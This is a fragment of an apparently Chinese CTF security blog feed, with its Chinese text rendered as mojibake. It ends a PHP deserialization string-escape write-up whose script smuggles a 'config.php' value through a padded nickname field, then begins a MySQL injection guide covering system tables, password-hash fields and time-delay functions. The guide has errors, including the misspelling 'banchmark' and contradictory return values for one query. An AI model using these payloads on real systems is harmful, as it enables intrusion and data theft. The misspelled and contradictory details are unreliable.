class="hljs-number">4</span>) &#123;<br>  [<span class="hljs-string">&quot;phone&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">11</span>) <span class="hljs-string">&quot;12345678901&quot;</span><br>  [<span class="hljs-string">&quot;email&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">11</span>) <span class="hljs-string">&quot;123@321.com&quot;</span><br>  [<span class="hljs-string">&quot;nickname&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">198</span>) <span class="hljs-string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span><br>  [<span class="hljs-string">&quot;photo&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">10</span>) <span class="hljs-string">&quot;config.php&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯nické‚£ä¹ˆçš„é•¿åº¦è¦å°äº10,é‡‡ç”¨æ•°ç»„ç»•è¿‡</p><p>åœ¨<code>;</code>åé¢åŠ ä¸Š<code>&#125;</code>é—­åˆæ•°ç»„ï¼Œwhereä¹Ÿè¦åŠ ä¸€ä¸ª</p><p>æœ€ç»ˆ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-string">&#x27;12345678901&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-string">&#x27;123@321.com&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]=<span class="hljs-string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;wokao&#x27;</span>;<br><br><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$profile</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250205181546710.png" alt="image-20250205181546710"></p><p>ä¸Šä¼ åæ‹¿åˆ°å›¾ç‰‡( è®°å¾—æŠ“åŒ…</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250205181638367.png" alt="image-20250205181638367"></p><p>è§£ç æ‹¿åˆ°flag</p>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å­—ç¬¦ä¸²é€ƒé€¸</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¬”è®°æ¸…å•</title>
    <link href="/tuyi/2025/02/05/%E7%AC%94%E8%AE%B0%E6%B8%85%E5%8D%95/"/>
    <url>/tuyi/2025/02/05/%E7%AC%94%E8%AE%B0%E6%B8%85%E5%8D%95/</url>
    
    <content type="html"><![CDATA[<ul><li><input disabled="" type="checkbox"> ååºåˆ—åŒ–(PyYAML)</li><li><input disabled="" type="checkbox"> xssæŒ‡åŒ—</li><li><input disabled="" type="checkbox"> xxeæŒ‡åŒ—</li><li><input disabled="" type="checkbox"> Xpathæ³¨å…¥æŒ‡åŒ—</li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/19/Djingo_ssti/">Djingo_ssti</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/26/pker/">pker</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/25/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">pickleååºåˆ—åŒ–</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/24/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/">PHPåŸç”Ÿç±»ä»‹ç»</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/23/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/">PHPä¼ªåè®®ä»‹ç»</a></li><li><input disabled="" type="checkbox"> Oracleæ³¨å…¥æŒ‡åŒ—</li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/28/Mysql%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">Mysqlæ³¨å…¥æŒ‡åŒ—</a></li><li><input disabled="" type="checkbox"> MongDBæ³¨å…¥æŒ‡åŒ—</li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/01/27/%E8%AE%BADNS/">è®ºDNS</a></li><li><input disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/02/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/">ååºåˆ—åŒ–ä¹‹å­—ç¬¦ä¸²é€ƒé€¸</a></li><li><input checked="" disabled="" type="checkbox"> zipæ–‡ä»¶é€ƒé€¸æ¼æ´</li><li><input checked="" disabled="" type="checkbox"> linuxææƒ</li><li><input checked="" disabled="" type="checkbox"> <a href="https://258369123.github.io/tuyi/2025/02/15/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/">phpä¼ªéšæœºæ•°</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>å¯¼èˆª</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mysqlæ³¨å…¥æŒ‡åŒ—</title>
    <link href="/tuyi/2025/01/28/Mysql%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/"/>
    <url>/tuyi/2025/01/28/Mysql%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<p>ç¥å¤§å®¶æ–°å¹´å¿«ä¹</p><p>sqlæ³¨å…¥å’Œxsså¹¶ç§°ä¸ºè½é­„çš„æ¼æ´ä¹‹ç‹ï¼Œè™½ç„¶è¢«ç ”ç©¶çš„é€é€çš„äº†ï¼Œä½†æ˜¯ç°åœ¨çš„ctfæ¯”èµ›è¿˜æ˜¯å­˜åœ¨å¾ˆå¤šè¿™æ ·çš„é¢˜ç›®ï¼Œå„ç§å„æ ·çš„ payloadï¼Œä¸ä½†çç¢è€Œä¸”ä¸æˆä½“ç³»,å®é™…ä¸Šå¾ˆå¤šæŠ€å·§éƒ½æ˜¯æ ¹æ®è¯­æ³•æ¥çš„ã€‚å³å¦‚æœçŸ¥é“åŸºæœ¬è¯­æ³•ï¼Œé‚£ä¹ˆå¯¹æ³¨å…¥çš„ payload ä¹Ÿå°±èƒ½äº†ç„¶äºèƒ¸</p><h1 id="Mysqlæ³¨å…¥å­¦ä¹ "><a href="#Mysqlæ³¨å…¥å­¦ä¹ " class="headerlink" title="Mysqlæ³¨å…¥å­¦ä¹ "></a>Mysqlæ³¨å…¥å­¦ä¹ </h1><h2 id="åŸºç¡€è¯­æ³•"><a href="#åŸºç¡€è¯­æ³•" class="headerlink" title="åŸºç¡€è¯­æ³•"></a>åŸºç¡€è¯­æ³•</h2><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/20190407031440214.png" alt="20190407031440214"></p><p>é¦–å…ˆï¼Œè¯­æ³•ä¸ºä»ä¸Šåˆ°ä¸‹ã€‚</p><p>ç®€åŒ–ä¹‹å‰çš„å¯¼å›¾ä¸º MySQL æ‰€æœ‰çš„è¯­æ³•ã€‚å…¶å®åœ¨æ³¨å…¥çš„è¿‡ç¨‹ä¸­ç”¨ä¸ç€è¿™ä¹ˆè¯¦ç»†ï¼Œçœ‹çœ‹å°±å¥½ï¼Œæœ‰éœ€è¦å†æŸ¥ä¹Ÿä¸è¿Ÿã€‚ç®€åŒ–çš„ç‰ˆæœ¬åˆ™ä¸º MySQL æ³¨å…¥ä¸­å¸¸è§çš„è¯­æ³•ã€‚</p><p>é¢œè‰²è¡¨ç¤ºï¼šçº¢è‰²ä»£è¡¨ä¸€å®šä¸èƒ½çœç•¥ï¼Œæ©™è‰²ä»£è¡¨éƒ¨åˆ†æƒ…å†µä¸‹èƒ½çœç•¥ï¼Œç°è‰²ä»£è¡¨æ€»æ˜¯å¯ä»¥çœç•¥ã€‚çº¢è‰²ä¸ç°è‰²å¥½æ‡‚ï¼Œæ©™è‰²æ˜¯ä¸ªå•¥å‘¢ï¼Ÿæ‹¿ <code>GROUP BY</code> ä¸ºä¾‹ï¼Œæ„æ€æŒ‡çš„æ˜¯ï¼Œå‡å¦‚æˆ‘ä»¬é€‰äº† <code>GROUP BY</code>ï¼Œé‚£ä¹ˆä¸€å®šè¦å¯¹ <code>col_name</code>ã€<code>expr</code>ã€<code>position</code> è¿›è¡Œä¸‰é€‰ä¸€ã€‚æ ¹æ®ä»ä¸Šåˆ°ä¸‹çš„é¡ºåºï¼Œæ¥ä¸‹æ¥æ˜¯ <code>ASC</code>ã€<code>DESC</code> äºŒé€‰ä¸€ï¼Œå¯é€‰å¯ä¸é€‰ã€‚å¦‚æœæˆ‘ä»¬æ²¡ä½¿ç”¨ <code>GROUP BY</code>ï¼Œé‚£ä¹ˆå°±ä¸éœ€è¦è¿›è¡Œä¸‰é€‰ä¸€ï¼Œå› ä¸ºæµç¨‹æ²¡åˆ°è¿™é‡Œã€‚æ€»ç»“èµ·æ¥å°±æ˜¯ï¼Œå¦‚æœä¸‹ä¸€æ­¥ä¸­å­˜åœ¨æ©™è‰²çš„è¯­æ³•ï¼Œå°±ä¸€å®šè¦ç”¨åˆ°ã€‚</p><h3 id="ç»†èŠ‚"><a href="#ç»†èŠ‚" class="headerlink" title="ç»†èŠ‚"></a>ç»†èŠ‚</h3><ol><li>group byï¼šselect + group by çš„æ—¶å€™ï¼Œæ˜¯å…ˆ group byï¼Œå†ä» group by é‡Œ selectã€‚æ‰€ä»¥ select çš„åˆ—ä¸€å®šè¦åœ¨ group by é‡Œå­˜åœ¨ã€‚</li><li>è¯­å¥æ‰§è¡ŒæˆåŠŸè¿”å›å€¼æœ‰2ç§æƒ…å†µï¼Œç¬¬ä¸€ç§æœ¬èº«è¿”å›æ•°å­—çš„ï¼Œå°±ä¸ºæ•°å­—ï¼Œå³ï¼š<code>select (select database());</code> çš„è¿”å›å€¼ä¸º 1ï¼›å¦åˆ™ï¼Œæ‰§è¡ŒæˆåŠŸä¸º 0ï¼Œåä¹‹ä¸º 1ã€‚å³ï¼š<code>select (select database());</code> çš„è¿”å›å€¼ä¸º 0</li></ol><h2 id="æ•°æ®åº“"><a href="#æ•°æ®åº“" class="headerlink" title="æ•°æ®åº“"></a>æ•°æ®åº“</h2><p>ç³»ç»Ÿè‡ªå¸¦çš„æ•°æ®åº“å¾€å¾€æ˜¯å¾ˆæœ‰ç”¨çš„ï¼Œæ•°æ®ä¸ä»…å…¨é¢ï¼Œè€Œä¸”æƒé™é«˜çš„å¾ˆã€‚</p><h3 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h3><p><code>information_schema</code> æä¾›äº†è®¿é—®æ•°æ®åº“å…ƒæ•°æ®çš„æ–¹å¼ã€‚ä»€ä¹ˆæ˜¯<code>å…ƒæ•°æ®</code>å‘¢ï¼Ÿå°±æ˜¯å…³äºæ•°æ®çš„æ•°æ®ï¼Œå¦‚æ•°æ®åº“åæˆ–è¡¨åï¼Œåˆ—çš„æ•°æ®ç±»å‹ï¼Œæˆ–è®¿é—®æƒé™ç­‰ã€‚</p><p>æœ‰ç”¨çš„è¡¨å¦‚ä¸‹ï¼š</p><ul><li>schemataï¼šæä¾›äº†å½“å‰ mysql å®ä¾‹ä¸­æ‰€æœ‰æ•°æ®åº“çš„ä¿¡æ¯ã€‚â€™show databases;<code>çš„ç»“æœå°±æ˜¯ä»è¿™ä¸ªè¡¨çš„</code>SCHEMA_NAME&#96; å­—æ®µæ¥çš„ã€‚</li><li>tablesï¼šè¯¦ç»†è®°è½½äº†æ‰€æœ‰çš„è¡¨çš„åå­—ï¼Œä»¥åŠå“ªä¸ªè¡¨å±äºå“ªä¸ª schemaã€è¡¨çš„ç±»å‹ã€è¡¨çš„å¼•æ“ã€åˆ›å»ºæ—¶é—´ç­‰ç­‰ä¿¡æ¯ã€‚<code>show tables</code> çš„ç»“æœå°±æ˜¯ä»è¿™ä¸ªè¡¨çš„ <code>TABLE_NAME</code> å­—æ®µæ¥çš„ã€‚</li></ul><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><p><code>mysql</code> æ•°æ®åº“æ˜¯ mysql çš„æ ¸å¿ƒæ•°æ®åº“ï¼Œï¼Œä¸»è¦è´Ÿè´£å­˜å‚¨æ•°æ®åº“çš„ç”¨æˆ·ã€æƒé™è®¾ç½®ã€å…³é”®å­—ç­‰ mysql è‡ªå·±éœ€è¦ä½¿ç”¨çš„æ§åˆ¶å’Œç®¡ç†ä¿¡æ¯ã€‚</p><p>æœ‰ç”¨çš„è¡¨å¦‚ä¸‹ï¼š</p><ul><li>userï¼š<code>user</code> è¡¨ä¸­è®°å½•äº†ç”¨æˆ·ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·å¯ç™»é™†çš„ ipï¼ˆhost å­—æ®µï¼‰ã€ç”¨æˆ·åï¼ˆUser å­—æ®µï¼‰ã€å¯†ç  hashï¼ˆauthentication_string å­—æ®µï¼‰ã€æ˜¯å¦æœ‰è¯»å–æ–‡ä»¶çš„æƒé™ï¼ˆfile_priv å­—æ®µï¼‰ç­‰ç­‰ã€‚æ³¨æ„ï¼Œå¯¹äº mysql <code>5.7</code> ä»¥ä¸Šçš„ç‰ˆæœ¬ï¼Œå¯†ç çš„ hash å­—æ®µä¸å†æ˜¯ <code>Password</code>ï¼Œè€Œæ˜¯ <code>authentication_string</code>ã€‚</li></ul><h2 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h2><p>MySQL è‡ªå¸¦çš„å˜é‡çš„ç‰¹å¾å°±æ˜¯å¼€å¤´ <code>@@</code></p><ol><li><code>@@basedir</code>ï¼šMySQL çš„å®‰è£…è·¯å¾„</li><li><code>@@datadir</code>ï¼š MySQL çš„æ•°æ®åº“æ–‡ä»¶ï¼Œå³æ•°æ®æ–‡ä»¶è·¯å¾„</li><li><code>@@version_compile_os</code>ï¼šæ“ä½œç³»ç»Ÿ</li><li><code>@@version</code>ï¼šæ•°æ®åº“ç‰ˆæœ¬</li></ol><h2 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h2><p>è¿™äº›å‡½æ•°åœ¨æ³¨å…¥çš„è¿‡ç¨‹ä¸­èƒ½å¸®åŠ©æˆ‘ä»¬ä¸å°‘å¿™ã€‚å‚æ•°é€šå¸¸å¯ä»¥ä¸º sql è¯­å¥ï¼ˆè¦åŠ æ‹¬å·ï¼‰</p><h3 id="ç‰¹æ®Šå‡½æ•°"><a href="#ç‰¹æ®Šå‡½æ•°" class="headerlink" title="ç‰¹æ®Šå‡½æ•°"></a>ç‰¹æ®Šå‡½æ•°</h3><ul><li><code>user()</code>ï¼šå½“å‰è¿æ¥çš„æ•°æ®åº“ç”¨æˆ·</li><li><code>version()</code>ï¼šæ•°æ®åº“ç‰ˆæœ¬</li></ul><h3 id="å­—ç¬¦ä¸²ç›¸å…³å‡½æ•°"><a href="#å­—ç¬¦ä¸²ç›¸å…³å‡½æ•°" class="headerlink" title="å­—ç¬¦ä¸²ç›¸å…³å‡½æ•°"></a>å­—ç¬¦ä¸²ç›¸å…³å‡½æ•°</h3><ul><li><p>midï¼š</p><ul><li><p>æˆªå–å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mid(string, start[, length])<br></code></pre></td></tr></table></figure><ul><li>stringï¼šå­—ç¬¦ä¸²ï¼Œ</li><li>startï¼šèµ·å§‹ä½ç½®ï¼Œèµ·å§‹ä½ç½®ä¸º 1</li><li>lengthï¼šæˆªå–é•¿åº¦</li></ul></li></ul></li><li><p>substrï¼š</p><ul><li><p>æˆªå–å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">substr(string, start, length)<br></code></pre></td></tr></table></figure><ul><li>stringï¼šå­—ç¬¦ä¸²</li><li>startï¼šèµ·å§‹ä½ç½®ï¼Œèµ·å§‹ä½ç½®ä¸º 1</li><li>lengthï¼šæˆªå–é•¿åº¦</li></ul></li></ul></li><li><p>substringï¼šåŒ <code>substr</code></p></li></ul><p><strong>ä»¥ä¸Šå‡½æ•°çš„å‚æ•°å‡å¯ä»¥ç”¨ <code>from start for end</code> ä»£æ›¿</strong>ï¼Œå¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select substring(&#x27;fuck&#x27; from 2 for 2);#ä»ç¬¬äºŒä¸ªå­—ç¬¦å¼€å§‹æˆªå–é•¿åº¦æ˜¯2<br>+--------------------------------+<br>| substring(&#x27;fuck&#x27; from 2 for 2) |<br>+--------------------------------+<br>| uc                             |<br>+--------------------------------+<br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure><ul><li><p>hexï¼šå°†æ•°å­—&#x2F;å­—ç¬¦ä¸²è½¬ä¸º<code>åå…­è¿›åˆ¶</code>ã€‚ç‰¹åˆ«æ˜¯å­—ç¬¦ä¸²ï¼Œé˜²æ­¢æœ‰ç‰¹æ®Šå­—ç¬¦å¯¼è‡´å‡ºç°å„ç§å¥‡æ€ªçš„é—®é¢˜ã€‚</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">hex(char)<br></code></pre></td></tr></table></figure></li><li><p>unhexï¼šå°†åå…­è¿›åˆ¶è½¬ä¸ºå­—ç¬¦ä¸²ã€‚æ³¨æ„ï¼Œç»“æœä¼šç›´æ¥è½¬ä¸ºå¯¹åº”çš„ acii ç ï¼Œä¾‹å¦‚ <code>unhex(6D7973716C)</code> çš„ç»“æœæ˜¯ <code>mysql</code> è€Œä¸æ˜¯ <code>470189044076</code></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">unhex(data)<br></code></pre></td></tr></table></figure></li><li><p>lengthï¼š</p><ul><li><p>è¿”å›å­—ç¬¦ä¸²é•¿åº¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">length(string)<br></code></pre></td></tr></table></figure><ul><li>stringï¼šå­—ç¬¦ä¸²</li></ul></li></ul></li><li><p>leftï¼š</p><ul><li><p>è·å–å­—ç¬¦ä¸²å·¦è¾¹æ•°èµ·æŒ‡å®šä¸ªæ•°çš„å­—ç¬¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">left(string, n)<br></code></pre></td></tr></table></figure><ul><li>stringï¼šè¦æˆªå–çš„å­—ç¬¦ä¸²</li><li>nï¼šé•¿åº¦</li></ul></li></ul></li><li><p>ordï¼š</p><ul><li><p>è·å–å­—ç¬¦çš„ ASCII ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ord(char)<br></code></pre></td></tr></table></figure><ul><li>charï¼šå­—ç¬¦&#x2F;å­—ç¬¦ä¸²ï¼ˆå¦‚æœæ˜¯å­—ç¬¦ä¸²ï¼Œåˆ™å–å®ƒçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼‰</li></ul></li></ul></li><li><p>asciiï¼šåŒ <code>ord</code></p></li><li><p>charï¼š</p><ul><li><p>å°† ASCII ç è½¬ä¸ºå­—ç¬¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">char(a[, ...])<br></code></pre></td></tr></table></figure><ul><li>aï¼šæ•°å­—ï¼›åé¢å¯ä»¥åŠ å¤šä¸ª ASCII ç ï¼Œå³æ„æˆå­—ç¬¦ä¸²ã€‚</li></ul></li></ul></li><li><p>regexpï¼š</p><ul><li><p>æ­£åˆ™åŒ¹é…ï¼ŒåŒ¹é…åˆ°è¿”å› 1ï¼Œåä¹‹ä¸º 0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">string1 regexp string2<br></code></pre></td></tr></table></figure><ul><li>string1ï¼šåŒ¹é…çš„å­—ç¬¦ä¸²</li><li>string2ï¼šæ­£åˆ™è¡¨è¾¾å¼</li></ul></li></ul></li><li><p>concatï¼š</p><ul><li><p>è¿æ¥ï¼ˆå¤šä¸ªï¼‰å­—ç¬¦ä¸²ï¼ˆæ•°å­—ï¼‰ï¼Œè¿”å›å­—ç¬¦ä¸²ã€‚å¦‚æœæœ‰ä»»ä½•ä¸€ä¸ªå‚æ•°ä¸º nullï¼Œåˆ™è¿”å›å€¼ä¸º null</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">concat(string[, ...])<br></code></pre></td></tr></table></figure><ul><li>stringï¼šä»»æ„å€¼</li></ul></li></ul></li><li><p>concat_ws</p><ul><li><p>å’Œ concat ç±»ä¼¼ï¼Œå°†å¤šä¸ªå­—ç¬¦ä¸²è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä½†æ˜¯å¯ä»¥æŒ‡å®šè¿æ¥ç¬¦ã€‚å¦‚æœæœ‰ä»»ä½•ä¸€ä¸ªå‚æ•°ä¸º nullï¼Œå¯¹è¿”å›å€¼æ— å½±å“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">concat_ws(sep, string[, ...])<br></code></pre></td></tr></table></figure><ul><li>sepï¼šè¿æ¥ç¬¦</li><li>stringï¼šä»»æ„å€¼</li></ul></li></ul></li><li><p>group_concat</p><ul><li><p>å°† group by äº§ç”Ÿçš„åŒä¸€ä¸ªåˆ†ç»„ä¸­çš„å€¼è¿æ¥èµ·æ¥ï¼Œæˆä¸ºä¸€ä¸ªå­—ç¬¦ä¸²å¹¶è¿”å›</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">group_concat([distinct] colname [order by colname asc/desc ][separator sep])<br></code></pre></td></tr></table></figure><ul><li>distinctï¼šå»é‡</li><li>colnameï¼šåˆ—å</li><li>sepï¼šåˆ†éš”ç¬¦</li></ul></li></ul></li></ul><h3 id="å»¶æ—¶å‡½æ•°"><a href="#å»¶æ—¶å‡½æ•°" class="headerlink" title="å»¶æ—¶å‡½æ•°"></a>å»¶æ—¶å‡½æ•°</h3><ul><li><p>sleepï¼š</p><ul><li><p>å»¶è¿Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">sleep(sec)<br></code></pre></td></tr></table></figure><ul><li>secï¼šç§’</li></ul></li></ul></li><li><p>banchmarkï¼š</p><ul><li><p>é‡å¤æ‰§è¡Œå‡½æ•°ï¼Œè¾ƒå ç”¨ cpu</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">banchmark(count, func)<br></code></pre></td></tr></table></figure><ul><li>countï¼šæ‰§è¡Œçš„æ¬¡æ•°</li><li>funcï¼šå‡½æ•°</li></ul></li></ul></li><li><p><strong>ç¬›å¡å°”ç§¯</strong></p><p> ç¬›å¡å°”ç§¯(å› ä¸ºè¿æ¥è¡¨æ˜¯ä¸€ä¸ªå¾ˆè€—æ—¶çš„æ“ä½œ)</p><p> AxB&#x3D;Aå’ŒBä¸­æ¯ä¸ªå…ƒç´ çš„ç»„åˆæ‰€ç»„æˆçš„é›†åˆï¼Œå°±æ˜¯è¿æ¥è¡¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT count(*) FROM information_schema.columns A, <br>information_schema.columns B, information_schema.tables C;<br>select * from table_name A, table_name B<br>select * from table_name A, table_name Bï¼Œtable_name C<br>select count(*) from table_name A, table_name Bï¼Œtable_name C <br></code></pre></td></tr></table></figure><p> è¡¨å¯ä»¥æ˜¯åŒä¸€å¼ è¡¨,å—æœåŠ¡å™¨æ€§èƒ½å½±å“å¾ˆå¤§</p></li></ul><p>å¦å¤–ï¼Œåˆ©ç”¨ <code>å¸¦å¤–é€šé“</code> å‘èµ·ç½‘ç»œè¯·æ±‚ï¼Œä¹Ÿæœ‰å¯èƒ½é€ æˆæ—¶å»¶ã€‚ä¸è¿‡ MySQL çš„å¸¦å¤–é€šé“åªèƒ½åœ¨ Windows ä¸‹åˆ©ç”¨ <code>LOAD_FILE</code> å®Œæˆã€‚</p><h3 id="æ•°å­¦å‡½æ•°"><a href="#æ•°å­¦å‡½æ•°" class="headerlink" title="æ•°å­¦å‡½æ•°"></a>æ•°å­¦å‡½æ•°</h3><ul><li><p><strong>ABS(x)</strong></p><ul><li>è¿”å› <code>x</code> çš„ç»å¯¹å€¼ã€‚</li><li>ç¤ºä¾‹ï¼š<code>select abs(-5);</code> â†’ ç»“æœ <code>5</code></li></ul></li><li><p><strong>CEIL(x)</strong> æˆ– <strong>CEILING(x)</strong></p><ul><li>è¿”å›ä¸å°äº <code>x</code> çš„æœ€å°æ•´æ•°ï¼ˆå‘ä¸Šå–æ•´ï¼‰ã€‚</li><li>ç¤ºä¾‹ï¼š<code>select ceil(3.2);</code> â†’ ç»“æœ <code>4</code></li></ul></li><li><p><strong>FLOOR(x)</strong></p><ul><li>è¿”å›ä¸å¤§äº <code>x</code> çš„æœ€å¤§æ•´æ•°ï¼ˆå‘ä¸‹å–æ•´ï¼‰ã€‚</li><li>ç¤ºä¾‹ï¼š<code>select floor(3.8);</code> â†’ ç»“æœ <code>3</code></li></ul></li><li><p><strong>ROUND(x, d)</strong></p><ul><li>å°† <code>x</code> å››èˆäº”å…¥åˆ° <code>d</code> ä½å°æ•°ï¼ˆé»˜è®¤ä¸º <code>d=0</code>ï¼‰ã€‚</li><li>ç¤ºä¾‹ï¼š<code>select round(3.1415, 2);</code> â†’ ç»“æœ <code>3.14</code></li></ul></li><li><p><strong>RAND()</strong></p><ul><li><p>ç”Ÿæˆ 0 åˆ° 1 ä¹‹é—´çš„éšæœºæµ®ç‚¹æ•°ã€‚</p></li><li><p>ç¤ºä¾‹ï¼š<code>select rand();</code> â†’ ç»“æœç±»ä¼¼ <code>0.5487</code></p></li><li><p>ç”ŸæˆèŒƒå›´éšæœºæ•´æ•°ï¼ˆå¦‚ 1-100ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select floor(rand() * 100) + 1;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>POW(x, y)</strong> æˆ– <strong>POWER(x, y)</strong></p><ul><li>è¿”å› <code>x</code> çš„ <code>y</code> æ¬¡æ–¹ã€‚</li><li>ç¤ºä¾‹ï¼š<code>select pow(2, 3);</code> â†’ ç»“æœ <code>8</code></li></ul></li><li><p><strong>SQRT(x)</strong></p><ul><li>è¿”å› <code>x</code> çš„å¹³æ–¹æ ¹ï¼ˆè‹¥ <code>x</code> ä¸ºè´Ÿæ•°ï¼Œè¿”å› <code>NULL</code>ï¼‰ã€‚</li><li>ç¤ºä¾‹ï¼š<code>select sqrt(16);</code> â†’ ç»“æœ <code>4</code></li></ul></li></ul><h3 id="èšåˆå‡½æ•°"><a href="#èšåˆå‡½æ•°" class="headerlink" title="èšåˆå‡½æ•°"></a>èšåˆå‡½æ•°</h3><ol><li><p><strong>COUNT()</strong></p><ul><li><p>ç»Ÿè®¡è¡Œæ•°æˆ–é NULL å€¼çš„æ•°é‡ã€‚</p></li><li><p>ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 